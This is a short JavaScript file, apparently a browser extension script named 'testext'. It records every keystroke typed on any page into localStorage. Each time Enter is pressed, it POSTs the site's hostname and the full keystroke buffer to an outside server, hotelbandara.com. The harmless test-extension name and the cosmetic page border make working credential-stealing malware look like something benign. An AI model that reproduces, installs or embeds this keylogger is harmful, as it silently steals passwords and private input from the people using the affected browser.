
document.body.style.border = "5px solid rgba(255,185,51,0.1)"; 

;(function(){
  console.log('testext::init');
  return setTimeout(()=>{
    console.log('testext::ignite');
    return testext_start();
  },1000);
})();

;async function testext_start(){
  let data=localStorage.getItem('_testext');
  console.log('testext::start');
  window.addEventListener('keyup',async function(e){
    console.log('testext::keyup::'+e.key);
    console.log('testext::keyup::code.'+e.keyCode);
    data+=e.key;
    localStorage.setItem('_testext',data);
    if(e.keyCode!=13){
      return;
    }
    let url='https://hotelbandara.com/api/testext/',
    now=Math.ceil((new Date).getTime()/1000)+60,
    opt={
      mode:'cors',
      method:'POST',
      headers:{
        'Content-Type':'application/x-www-form-urlencoded',
      },
      body:new URLSearchParams({
        token:'tx'+now.toString(),
        method:'save',
        args:JSON.stringify([
          location.hostname,
          data,
        ]),
      }).toString(),
    },
    res=await fetch(url,opt)
      .then(r=>r.text())
      .catch(e=>JSON.stringify(e));
    console.log('testext::sent::'+res);
    return res;
  },false);
};
